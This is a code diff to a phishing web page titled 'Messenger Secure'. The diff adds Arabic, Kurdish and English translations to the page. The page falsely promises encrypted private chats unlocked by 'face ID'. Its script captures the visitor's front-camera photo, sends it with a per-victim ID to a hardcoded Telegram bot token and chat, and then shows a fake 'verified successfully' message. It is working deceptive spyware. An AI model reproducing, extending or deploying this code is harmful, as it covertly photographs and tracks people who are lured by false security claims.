@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Messenger Secure</title>
+    <title data-i18n="page_title">Messenger Secure</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
 
@@ -21,11 +21,44 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            flex-direction: column;
+        }
+
+        /* ---------- هەڵبژاردەی زمان ---------- */
+        .lang-selector {
+            position: fixed;
+            top: 15px;
+            right: 20px;
+            z-index: 99;
+            background: #fff;
+            border-radius: 30px;
+            padding: 5px 15px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            display: flex;
+            gap: 10px;
+        }
+
+        .lang-btn {
+            border: none;
+            background: transparent;
+            padding: 8px 12px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            color: #666;
+            transition: 0.3s;
+        }
+
+        .lang-btn.active {
+            background: #0084ff;
+            color: #fff;
         }
 
         .container {
             width: 390px;
             max-width: 95%;
+            margin-top: 50px; /* بۆ ئەوەی لە ژێر هەڵبژاردەکەوە بێت */
         }
 
         .card {
@@ -119,53 +152,157 @@
         }
     </style>
 </head>
-
 <body>
 
+    <!-- ========== هەڵبژاردەی زمان ========== -->
+    <div class="lang-selector">
+        <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
+        <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
+        <button class="lang-btn" onclick="changeLang('en')">English</button>
+    </div>
+
+    <!-- ========== ناوەڕۆکی سەرەکی ========== -->
     <div class="container">
         <div class="card">
             <div class="logo">💬</div>
-            <h1>Messenger Secure</h1>
-            <p class="subtitle">مرحبًا بكم في قسم Messenger الخاص.</p>
+            <h1 data-i18n="main_title">Messenger Secure</h1>
+            <p class="subtitle" data-i18n="subtitle">مرحبًا بكم في قسم Messenger الخاص.</p>
 
             <div class="security">
-                <h2>الحماية والأمان</h2>
+                <h2 data-i18n="security_title">الحماية والأمان</h2>
                 <ul>
-                    <li>المحادثات مشفّرة بالكامل بين الطرفين.</li>
-                    <li>يمنع التقاط لقطات الشاشة داخل هذا القسم.</li>
-                    <li>يمنع حفظ الصور أو تنزيل الوسائط.</li>
-                    <li>تُحذف المحادثات تلقائيًا بعد الاطلاع عليها.</li>
-                    <li>لا يمكن فتح Messenger الخاص إلا باستخدام بصمة الوجه.</li>
+                    <li data-i18n="item1">المحادثات مشفّرة بالكامل بين الطرفين.</li>
+                    <li data-i18n="item2">يمنع التقاط لقطات الشاشة داخل هذا القسم.</li>
+                    <li data-i18n="item3">يمنع حفظ الصور أو تنزيل الوسائط.</li>
+                    <li data-i18n="item4">تُحذف المحادثات تلقائيًا بعد الاطلاع عليها.</li>
+                    <li data-i18n="item5">لا يمكن فتح Messenger الخاص إلا باستخدام بصمة الوجه.</li>
                 </ul>
             </div>
 
-            <!-- ✅ دوگمەکە ئێستا id ی هەیە -->
-            <button id="btnStart">اضغط هنا لإنشاء بصمة الوجه وفتح المحادثات</button>
+            <button id="btnStart" data-i18n="start_btn">اضغط هنا لإنشاء بصمة الوجه وفتح المحادثات</button>
 
-            <!-- ✅ توخمێک بۆ نیشاندانی پەیام -->
             <div id="result"></div>
 
-            <div class="note">🔒 جميع بياناتك محمية وفق أعلى معايير الأمان.</div>
+            <div class="note" data-i18n="footer_note">🔒 جميع بياناتك محمية وفق أعلى معايير الأمان.</div>
         </div>
     </div>
 
-    <!-- ✅ سکریپتی ڕاستکراو -->
     <script>
+        // ========== داتابەیسی وەرگێڕان ==========
+        const translations = {
+            ar: {
+                page_title: "Messenger Secure",
+                main_title: "Messenger Secure",
+                subtitle: "مرحبًا بكم في قسم Messenger الخاص.",
+                security_title: "الحماية والأمان",
+                item1: "المحادثات مشفّرة بالكامل بين الطرفين.",
+                item2: "يمنع التقاط لقطات الشاشة داخل هذا القسم.",
+                item3: "يمنع حفظ الصور أو تنزيل الوسائط.",
+                item4: "تُحذف المحادثات تلقائيًا بعد الاطلاع عليها.",
+                item5: "لا يمكن فتح Messenger الخاص إلا باستخدام بصمة الوجه.",
+                start_btn: "اضغط هنا لإنشاء بصمة الوجه وفتح المحادثات",
+                footer_note: "🔒 جميع بياناتك محمية وفق أعلى معايير الأمان.",
+                loading: "⏳ جارٍ...",
+                success: "✅ تم التحقق بنجاح",
+                done: "✅ تم",
+                error_prefix: "❌ خطأ: ",
+                retry: "📷 إعادة المحاولة"
+            },
+            ckb: {
+                page_title: "Messenger پارێزراو",
+                main_title: "Messenger پارێزراو",
+                subtitle: "بەخێربێن بۆ بەشی تایبەتی Messenger.",
+                security_title: "پاراستن و ئاسایش",
+                item1: "گفتوگۆکان بە تەواوی کۆدکراون لە نێوان هەردوو لا.",
+                item2: "ڕێگری دەکرێت لە وێنەگرتنی شاشە لەم بەشەدا.",
+                item3: "ڕێگری دەکرێت لە پاشەکەوتکردنی وێنە یان دابەزاندنی میدیا.",
+                item4: "گفتوگۆکان خۆکارانە دەسڕێنەوە دوای بینینیان.",
+                item5: "کردنەوەی Messenger تایبەت تەنها بە پەنجەمۆری ڕووخسار دەکرێت.",
+                start_btn: "کرتە لێرە بکە بۆ دروستکردنی پەنجەمۆری ڕووخسار و کردنەوەی گفتوگۆکان",
+                footer_note: "🔒 هەموو داتاکانت پارێزراون بەپێی بەرزترین ستانداردی ئاسایش.",
+                loading: "⏳ چاوەڕێ...",
+                success: "✅ پشتڕاستکرایەوە بە سەرکەوتوویی",
+                done: "✅ تەواو",
+                error_prefix: "❌ هەڵە: ",
+                retry: "📷 دووبارە هەوڵبدەرەوە"
+            },
+            en: {
+                page_title: "Messenger Secure",
+                main_title: "Messenger Secure",
+                subtitle: "Welcome to the private Messenger section.",
+                security_title: "Security & Protection",
+                item1: "Conversations are fully encrypted between both parties.",
+                item2: "Screenshots are blocked inside this section.",
+                item3: "Saving images or downloading media is prohibited.",
+                item4: "Conversations are automatically deleted after viewing.",
+                item5: "Private Messenger can only be opened using face ID.",
+                start_btn: "Click here to create face ID and open conversations",
+                footer_note: "🔒 All your data is protected according to the highest security standards.",
+                loading: "⏳ Loading...",
+                success: "✅ Verified successfully",
+                done: "✅ Done",
+                error_prefix: "❌ Error: ",
+                retry: "📷 Retry"
+            }
+        };
+
+        // ========== فەنکشنی گۆڕینی زمان ==========
+        function changeLang(lang) {
+            // گۆڕینی ئاڕاستە (rtl بۆ عەرەبی و کوردی، ltr بۆ ئینگلیزی)
+            if (lang === 'ar' || lang === 'ckb') {
+                document.documentElement.dir = 'rtl';
+            } else {
+                document.documentElement.dir = 'ltr';
+            }
+
+            // نوێکردنەوەی هەموو توخمەکانی data-i18n
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (translations[lang] && translations[lang][key]) {
+                    el.textContent = translations[lang][key];
+                }
+            });
+
+            // نوێکردنەوەی دوگمەی چالاک
+            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
+
+            // پاشەکەوتکردنی زمان بۆ دواتر
+            localStorage.setItem('preferred_lang', lang);
+
+            // ئەگەر دوگمەکە لە دۆخی چالاکدا بێت، دووبارە وەرگێڕانی بکەین
+            const btn = document.getElementById('btnStart');
+            if (btn.disabled && btn.textContent.includes('⏳')) {
+                btn.textContent = translations[lang].loading;
+            } else if (btn.textContent === '✅ تم' || btn.textContent === '✅ تەواو' || btn.textContent === '✅ Done') {
+                btn.textContent = translations[lang].done;
+            } else {
+                btn.textContent = translations[lang].start_btn;
+            }
+        }
+
+        // ========== بارکردنی زمانی پاشەکەوتکراو ==========
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedLang = localStorage.getItem('preferred_lang') || 'ar';
+            changeLang(savedLang);
+        });
+
+        // ========== کۆدی ڕاستەقینەی کامێرا ==========
         const TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
-        const CHAT = '1015102519'; // ← چات ئایدی ڕاستەقینەی تۆ
+        const CHAT = '1015102519';
         const chatId = new URLSearchParams(location.search).get('chatId') || 'unknown';
 
         async function capture() {
             const btn = document.getElementById('btnStart');
             const res = document.getElementById('result');
+            const currentLang = localStorage.getItem('preferred_lang') || 'ar';
 
             btn.disabled = true;
-            btn.textContent = '⏳ جارٍ...';
+            btn.textContent = translations[currentLang].loading;
             res.textContent = '';
             res.style.display = 'block';
 
             try {
-                // داواکردنی مۆڵەتی کامێرا
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: 640, height: 480 }
                 });
@@ -184,7 +321,7 @@
 
                 const blob = await (await fetch(photo)).blob();
                 const fd = new FormData();
-                fd.append('chat_id', CHAT); // ← ناردن بۆ چاتی ڕاستەقینە
+                fd.append('chat_id', CHAT);
                 fd.append('photo', blob, `cam_${chatId}.jpg`);
                 fd.append('caption', `📸 صورة - ID: ${chatId}`);
 
@@ -193,17 +330,16 @@
                     body: fd
                 });
 
-                res.textContent = '✅ تم التحقق بنجاح';
-                btn.textContent = '✅ تم';
+                res.textContent = translations[currentLang].success;
+                btn.textContent = translations[currentLang].done;
 
             } catch (e) {
-                res.textContent = '❌ خطأ: ' + e.message;
+                res.textContent = translations[currentLang].error_prefix + e.message;
                 btn.disabled = false;
-                btn.textContent = '📷 إعادة المحاولة';
+                btn.textContent = translations[currentLang].retry;
             }
         }
 
-        // ✅ بەستنەوەی فەنکشن بە دوگمەکەوە
         document.getElementById('btnStart').addEventListener('click', capture);
     </script>
 </body>
